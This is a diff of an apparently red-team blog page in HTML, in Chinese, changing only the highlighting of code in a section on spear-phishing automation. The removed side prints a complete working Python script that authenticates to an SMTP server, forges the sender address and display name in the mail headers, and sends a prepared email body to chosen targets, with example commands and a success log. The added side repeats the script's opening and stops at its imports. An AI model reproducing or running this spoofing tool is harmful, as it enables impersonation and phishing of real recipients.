@@ -311,177 +311,177 @@ Cache-Control: no-cache
 <p>信需要串联许多细节性的信息，根据人类的心理，寻找突破口。将目标构建在一个它所熟悉的区域内，将会降低他的警惕性。</p>
 <h3 id="鱼叉攻击--自动化">鱼叉攻击 – 自动化</h3>
 <p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/8bd0f444-4f5f-11ec-ad16-00d861bf4abb.png" alt="2020-02-05-07-15-08"></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/python</span>
-<span style="color:#e6db74">&#34;&#34;&#34;
-</span><span style="color:#e6db74">@Rvn0xsy - 鱼叉自动化脚本
-</span><span style="color:#e6db74">
-</span><span style="color:#e6db74">该脚本需要一个邮件服务器用来Relay，其次需要一个邮件正文eml文件用于发送，邮件服务器需要满足以下条件：
-</span><span style="color:#e6db74">
-</span><span style="color:#e6db74">1.支持转发
-</span><span style="color:#e6db74">2.SPF
-</span><span style="color:#e6db74">3.DKIM
-</span><span style="color:#e6db74">
-</span><span style="color:#e6db74">格式解释：
-</span><span style="color:#e6db74">&#39;=?UTF-8?B?这里是BASE64编码?=&#39;
-</span><span style="color:#e6db74">
-</span><span style="color:#e6db74">B = Base64
-</span><span style="color:#e6db74">
-</span><span style="color:#e6db74">其中eml文件需要去除Header部分，脚本负责重构。
-</span><span style="color:#e6db74">
-</span><span style="color:#e6db74">
-</span><span style="color:#e6db74">Example &gt;
-</span><span style="color:#e6db74">
-</span><span style="color:#e6db74">$ python .\smtp-relay.py -f &lt;发送邮箱&gt; -t &lt;目标邮箱&gt; -u &lt;邮箱用户名&gt; -p &lt;邮箱密码&gt; -r &lt;伪造对象&gt; --relay_name &lt;伪造对象名称&gt; --subject &lt;邮件标题&gt; -b &lt;邮件正文文件&gt;
-</span><span style="color:#e6db74">~\Desktop&gt; python .\smtp-relay.py -f rvn0xsy@gmail.com -t rvn0xsy@gmail.com -u user -p XXX -r admin@gmail.com --relay_name 二维码科技 --subject 测试 -b .\send.eml
-</span><span style="color:#e6db74">2019-07-24 22:39:50,861 - .\smtp-relay.py[line:80] - INFO: 235 Authentication successful
-</span><span style="color:#e6db74">2019-07-24 22:39:53,979 - .\smtp-relay.py[line:52] - INFO: 250 Data Ok
-</span><span style="color:#e6db74">2019-07-24 22:39:53,983 - .\smtp-relay.py[line:87] - INFO: QUIT
-</span><span style="color:#e6db74">
-</span><span style="color:#e6db74">PS: DATA内容就是eml文件
-</span><span style="color:#e6db74">
-</span><span style="color:#e6db74">============&lt;Header&gt;============
-</span><span style="color:#e6db74">Date: Wed, 24 Jul 2019 15:47:10 +0800 (CST)
-</span><span style="color:#e6db74">From: =?UTF-8?B?xxx?= xxx
-</span><span style="color:#e6db74">To: xxx
-</span><span style="color:#e6db74">Subject: =?UTF-8?B?xxx?=
-</span><span style="color:#e6db74">============&lt;/Header&gt;============
-</span><span style="color:#e6db74">
-</span><span style="color:#e6db74">============&lt;DATA&gt;============
-</span><span style="color:#e6db74">
-</span><span style="color:#e6db74">X-Mailer: Server Version 1.0
-</span><span style="color:#e6db74">Content-Type: multipart/mixed; 
-</span><span style="color:#e6db74">	boundary=&#34;----=_Part_65_550351629.1563948317509&#34;
-</span><span style="color:#e6db74">MIME-Version: 1.0
-</span><span style="color:#e6db74">Message-ID: &lt;7a422a.12.16c22957b47.xxx&gt;
-</span><span style="color:#e6db74">Date: Wed, 24 Jul 2019 15:47:10 +0800 (CST)
-</span><span style="color:#e6db74">
-</span><span style="color:#e6db74">------=_Part_65_550351629.1563948317509
-</span><span style="color:#e6db74">Content-Type: multipart/alternative; 
-</span><span style="color:#e6db74">	boundary=&#34;----=_Part_67_1156720723.1563948317510&#34;
-</span><span style="color:#e6db74">
-</span><span style="color:#e6db74">------=_Part_67_1156720723.1563948317510
-</span><span style="color:#e6db74">Content-Type: text/plain; charset=UTF-8
-</span><span style="color:#e6db74">Content-Transfer-Encoding: base64
-</span><span style="color:#e6db74">
-</span><span style="color:#e6db74">5L2g5Lus5aW95qOS77yB5Yqg5rK577yB
-</span><span style="color:#e6db74">
-</span><span style="color:#e6db74">------=_Part_67_1156720723.1563948317510
-</span><span style="color:#e6db74">
-</span><span style="color:#e6db74">============&lt;/DATA&gt;============
-</span><span style="color:#e6db74">&#34;&#34;&#34;</span>
-<span style="color:#f92672">import</span> telnetlib
-<span style="color:#f92672">import</span> time
-<span style="color:#f92672">import</span> logging
-<span style="color:#f92672">import</span> base64
-<span style="color:#f92672">import</span> argparse
-
-logging<span style="color:#f92672">.</span>basicConfig(format<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">%(asctime)s</span><span style="color:#e6db74"> - </span><span style="color:#e6db74">%(pathname)s</span><span style="color:#e6db74">[line:</span><span style="color:#e6db74">%(lineno)d</span><span style="color:#e6db74">] - </span><span style="color:#e6db74">%(levelname)s</span><span style="color:#e6db74">: </span><span style="color:#e6db74">%(message)s</span><span style="color:#e6db74">&#39;</span>,level<span style="color:#f92672">=</span>logging<span style="color:#f92672">.</span>INFO)
-
-<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">SMTPClient</span>():
-    <span style="color:#66d9ef">def</span> __init__(self,):
-        self<span style="color:#f92672">.</span>mail_from <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
-        self<span style="color:#f92672">.</span>mail_to <span style="color:#f92672">=</span> []
-        self<span style="color:#f92672">.</span>send_data <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
-        self<span style="color:#f92672">.</span>mail_header <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
-        self<span style="color:#f92672">.</span>tn <span style="color:#f92672">=</span> telnetlib<span style="color:#f92672">.</span>Telnet()
-    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">set_mail_header</span>(self,mail_subject,mail_relay,mail_relay_name):
-        now_date <span style="color:#f92672">=</span> time<span style="color:#f92672">.</span>strftime(<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%a</span><span style="color:#e6db74">, </span><span style="color:#e6db74">%d</span><span style="color:#e6db74"> %b %Y %H:%M:%S +0800 (CST)&#34;</span>, time<span style="color:#f92672">.</span>localtime())
-        self<span style="color:#f92672">.</span>mail_header <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Date: </span><span style="color:#e6db74">{}</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">From: =?UTF-8?B?</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">?= &lt;</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&gt;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">To: </span><span style="color:#e6db74">{}</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">Subject: =?UTF-8?B?</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">?=</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(now_date,
-            base64<span style="color:#f92672">.</span>b64encode(mail_relay_name<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>decode(),
-            mail_relay,
-            self<span style="color:#f92672">.</span>mail_to[<span style="color:#ae81ff">0</span>],base64<span style="color:#f92672">.</span>b64encode(mail_subject<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>decode())
-        
-    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">set_mail</span>(self,mail_from,mail_to,send_body):
-        self<span style="color:#f92672">.</span>mail_from <span style="color:#f92672">=</span> mail_from
-        self<span style="color:#f92672">.</span>mail_to <span style="color:#f92672">=</span> mail_to
-        <span style="color:#66d9ef">with</span> open(send_body, <span style="color:#e6db74">&#34;rb&#34;</span>) <span style="color:#66d9ef">as</span> f_body:
-            self<span style="color:#f92672">.</span>send_data <span style="color:#f92672">=</span> f_body<span style="color:#f92672">.</span>read()
-        f_body<span style="color:#f92672">.</span>close()
-    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">send_ehlo</span>(self, content):
-        self<span style="color:#f92672">.</span>tn<span style="color:#f92672">.</span>write(content<span style="color:#f92672">.</span>encode())
-
-    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">send_mail</span>(self):
-        mail_from <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;MAIL FROM:&lt;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&gt;&#34;</span> <span style="color:#f92672">%</span> self<span style="color:#f92672">.</span>mail_from
-        logging<span style="color:#f92672">.</span>info(mail_from)
-        <span style="color:#75715e"># 250 Mail Ok</span>
-        self<span style="color:#f92672">.</span>tn<span style="color:#f92672">.</span>write(mail_from<span style="color:#f92672">.</span>encode() <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span>)
-        self<span style="color:#f92672">.</span>tn<span style="color:#f92672">.</span>read_until(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;250 Mail Ok</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>,timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span>)
-        logging<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;250 Mail Ok&#34;</span>)
-        
-        <span style="color:#66d9ef">for</span> mail <span style="color:#f92672">in</span> self<span style="color:#f92672">.</span>mail_to:
-            mail_rpct <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;RCPT TO:&lt;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&gt;&#34;</span> <span style="color:#f92672">%</span> mail
-            self<span style="color:#f92672">.</span>tn<span style="color:#f92672">.</span>write(mail_rpct<span style="color:#f92672">.</span>encode() <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span>)
-            self<span style="color:#f92672">.</span>tn<span style="color:#f92672">.</span>read_until(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;250 Rcpt Ok</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>,timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span>)
-            logging<span style="color:#f92672">.</span>info(mail_rpct)
-        <span style="color:#75715e"># 250 Rcpt Ok</span>
-        self<span style="color:#f92672">.</span>tn<span style="color:#f92672">.</span>write(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;DATA</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
-        self<span style="color:#f92672">.</span>tn<span style="color:#f92672">.</span>read_until(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>,timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span>)
-        <span style="color:#75715e"># 354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;</span>
-        send_all <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>mail_header<span style="color:#f92672">.</span>encode()<span style="color:#f92672">+</span>self<span style="color:#f92672">.</span>send_data<span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">.</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>
-        <span style="color:#75715e"># self.tn.write(self.mail_header.encode()+b&#34;\r\n&#34;)</span>
-        <span style="color:#75715e"># self.tn.write(self.send_data+b&#34;\r\n.\r\n&#34;)</span>
-        self<span style="color:#f92672">.</span>tn<span style="color:#f92672">.</span>write(send_all)
-        <span style="color:#75715e"># 250 Data Ok: queued as freedom</span>
-        self<span style="color:#f92672">.</span>tn<span style="color:#f92672">.</span>read_until(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;250 Data Ok: queued as freedom</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>,timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span>)
-        logging<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;250 Data Ok&#34;</span>)
-    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">login_host</span>(self,host_ip,username,password):
-        <span style="color:#66d9ef">try</span>:
-            self<span style="color:#f92672">.</span>tn<span style="color:#f92672">.</span>open(host_ip,port<span style="color:#f92672">=</span><span style="color:#ae81ff">25</span>)
-        <span style="color:#66d9ef">except</span>:
-            logging<span style="color:#f92672">.</span>warning(<span style="color:#e6db74">&#39;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74"> Connect Error..&#39;</span><span style="color:#f92672">%</span>host_ip)
-            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
-        self<span style="color:#f92672">.</span>send_ehlo(<span style="color:#e6db74">&#34;EHLO virtual-machine</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>)
-        <span style="color:#75715e"># 250-smtp.aliyun-inc.com</span>
-        <span style="color:#75715e"># 250-STARTTLS</span>
-        <span style="color:#75715e"># 250-8BITMIME</span>
-        <span style="color:#75715e"># 250-AUTH=PLAIN LOGIN XALIOAUTH</span>
-        <span style="color:#75715e"># 250-AUTH PLAIN LOGIN XALIOAUTH</span>
-        <span style="color:#75715e"># 250-PIPELINING</span>
-        <span style="color:#75715e"># 250 DSN</span>
-        self<span style="color:#f92672">.</span>tn<span style="color:#f92672">.</span>read_until(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;250-smtp.aliyun-inc.com</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>,timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span>)
-        self<span style="color:#f92672">.</span>tn<span style="color:#f92672">.</span>read_until(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;250-STARTTLS</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>,timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span>)
-        self<span style="color:#f92672">.</span>tn<span style="color:#f92672">.</span>read_until(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;250-8BITMIME</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>,timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span>)
-        self<span style="color:#f92672">.</span>tn<span style="color:#f92672">.</span>read_until(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;250-AUTH=PLAIN LOGIN XALIOAUTH</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>,timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span>)
-        self<span style="color:#f92672">.</span>tn<span style="color:#f92672">.</span>read_until(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;250-AUTH PLAIN LOGIN XALIOAUTH</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>,timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span>)
-        self<span style="color:#f92672">.</span>tn<span style="color:#f92672">.</span>read_until(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;250-PIPELINING</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>,timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span>)
-        self<span style="color:#f92672">.</span>tn<span style="color:#f92672">.</span>read_until(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;250 DSN</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>,timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span>)
-        self<span style="color:#f92672">.</span>tn<span style="color:#f92672">.</span>write(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;AUTH LOGIN</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>)
-        self<span style="color:#f92672">.</span>tn<span style="color:#f92672">.</span>read_until(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;334 dXNlcm5hbWU6</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>,timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span>)
-        self<span style="color:#f92672">.</span>tn<span style="color:#f92672">.</span>write(base64<span style="color:#f92672">.</span>b64encode(username<span style="color:#f92672">.</span>encode()) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span>)
-        self<span style="color:#f92672">.</span>tn<span style="color:#f92672">.</span>read_until(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;334 UGFzc3dvcmQ6</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>,timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span>)
-        self<span style="color:#f92672">.</span>tn<span style="color:#f92672">.</span>write(base64<span style="color:#f92672">.</span>b64encode(password<span style="color:#f92672">.</span>encode()) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span>)
-        self<span style="color:#f92672">.</span>tn<span style="color:#f92672">.</span>read_until(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;235 Authentication successful</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>,timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span>)
-        logging<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;235 Authentication successful&#34;</span>)
-        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">True</span>
-
-    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">logout_host</span>(self):
-        self<span style="color:#f92672">.</span>tn<span style="color:#f92672">.</span>write(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;QUIT</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>)
-        self<span style="color:#f92672">.</span>tn<span style="color:#f92672">.</span>read_until(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;221 Bye</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>,timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span>)
-        self<span style="color:#f92672">.</span>tn<span style="color:#f92672">.</span>close()
-        logging<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;QUIT&#34;</span>)
-
-<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
-    parser <span style="color:#f92672">=</span> argparse<span style="color:#f92672">.</span>ArgumentParser()
-    parser<span style="color:#f92672">.</span>description <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;AMAIL SMTP Relay Client - Version 1.0&#34;</span>
-    parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;-f&#34;</span>,<span style="color:#e6db74">&#34;--mail_from&#34;</span>,type<span style="color:#f92672">=</span>str,help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Mail From&#34;</span>,required <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>)
-    parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;-t&#34;</span>,<span style="color:#e6db74">&#34;--mail_to&#34;</span>,type<span style="color:#f92672">=</span>str,help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Mail To&#34;</span>,required <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>)
-    parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;-u&#34;</span>,<span style="color:#e6db74">&#34;--username&#34;</span>,type<span style="color:#f92672">=</span>str,help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;SMTP Username&#34;</span>,required <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>)
-    parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;-p&#34;</span>,<span style="color:#e6db74">&#34;--password&#34;</span>,type<span style="color:#f92672">=</span>str,help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;SMTP Password&#34;</span>,required <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>)
-    parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;-s&#34;</span>,<span style="color:#e6db74">&#34;--server&#34;</span>,type<span style="color:#f92672">=</span>str,help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;SMTP Server&#34;</span>, default<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;smtp.mxhichina.com&#34;</span>)
-    parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;-b&#34;</span>,<span style="color:#e6db74">&#34;--body&#34;</span>,type<span style="color:#f92672">=</span>str,help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Mail Body&#34;</span>, required <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>)
-    parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;-r&#34;</span>,<span style="color:#e6db74">&#34;--relay&#34;</span>,type<span style="color:#f92672">=</span>str,help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Mail Relay To&#34;</span>, required <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>)
-    parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;--relay_name&#34;</span>,type<span style="color:#f92672">=</span>str,help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Mail Relay To Name&#34;</span>, required <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>)
-    parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;--subject&#34;</span>,type<span style="color:#f92672">=</span>str,help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Mail Subject&#34;</span>, required <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>)
-    args <span style="color:#f92672">=</span> parser<span style="color:#f92672">.</span>parse_args()
-    
-    smtp_client <span style="color:#f92672">=</span> SMTPClient()
-
-    <span style="color:#66d9ef">if</span> smtp_client<span style="color:#f92672">.</span>login_host(args<span style="color:#f92672">.</span>server,args<span style="color:#f92672">.</span>username,args<span style="color:#f92672">.</span>password):
-        smtp_client<span style="color:#f92672">.</span>set_mail(args<span style="color:#f92672">.</span>mail_from,args<span style="color:#f92672">.</span>mail_to<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;,&#34;</span>),args<span style="color:#f92672">.</span>body)
-        smtp_client<span style="color:#f92672">.</span>set_mail_header(args<span style="color:#f92672">.</span>subject,args<span style="color:#f92672">.</span>relay,args<span style="color:#f92672">.</span>relay_name)
-        smtp_client<span style="color:#f92672">.</span>send_mail()
-        smtp_client<span style="color:#f92672">.</span>logout_host()
-</code></pre></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">@Rvn0xsy - 鱼叉自动化脚本
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">该脚本需要一个邮件服务器用来Relay，其次需要一个邮件正文eml文件用于发送，邮件服务器需要满足以下条件：
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">1.支持转发
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">2.SPF
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">3.DKIM
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">格式解释：
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;=?UTF-8?B?这里是BASE64编码?=&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">B = Base64
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">其中eml文件需要去除Header部分，脚本负责重构。
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Example &gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">$ python .\smtp-relay.py -f &lt;发送邮箱&gt; -t &lt;目标邮箱&gt; -u &lt;邮箱用户名&gt; -p &lt;邮箱密码&gt; -r &lt;伪造对象&gt; --relay_name &lt;伪造对象名称&gt; --subject &lt;邮件标题&gt; -b &lt;邮件正文文件&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">~\Desktop&gt; python .\smtp-relay.py -f rvn0xsy@gmail.com -t rvn0xsy@gmail.com -u user -p XXX -r admin@gmail.com --relay_name 二维码科技 --subject 测试 -b .\send.eml
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">2019-07-24 22:39:50,861 - .\smtp-relay.py[line:80] - INFO: 235 Authentication successful
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">2019-07-24 22:39:53,979 - .\smtp-relay.py[line:52] - INFO: 250 Data Ok
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">2019-07-24 22:39:53,983 - .\smtp-relay.py[line:87] - INFO: QUIT
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">PS: DATA内容就是eml文件
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">============&lt;Header&gt;============
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Date: Wed, 24 Jul 2019 15:47:10 +0800 (CST)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">From: =?UTF-8?B?xxx?= xxx
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">To: xxx
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Subject: =?UTF-8?B?xxx?=
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">============&lt;/Header&gt;============
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">============&lt;DATA&gt;============
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">X-Mailer: Server Version 1.0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Content-Type: multipart/mixed; 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	boundary=&#34;----=_Part_65_550351629.1563948317509&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">MIME-Version: 1.0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Message-ID: &lt;7a422a.12.16c22957b47.xxx&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Date: Wed, 24 Jul 2019 15:47:10 +0800 (CST)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">------=_Part_65_550351629.1563948317509
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Content-Type: multipart/alternative; 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	boundary=&#34;----=_Part_67_1156720723.1563948317510&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">------=_Part_67_1156720723.1563948317510
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Content-Type: text/plain; charset=UTF-8
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Content-Transfer-Encoding: base64
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">5L2g5Lus5aW95qOS77yB5Yqg5rK577yB
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">------=_Part_67_1156720723.1563948317510
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">============&lt;/DATA&gt;============
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> telnetlib
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> logging
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> base64
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> argparse
+</span></span><span style="display:flex;"><span>
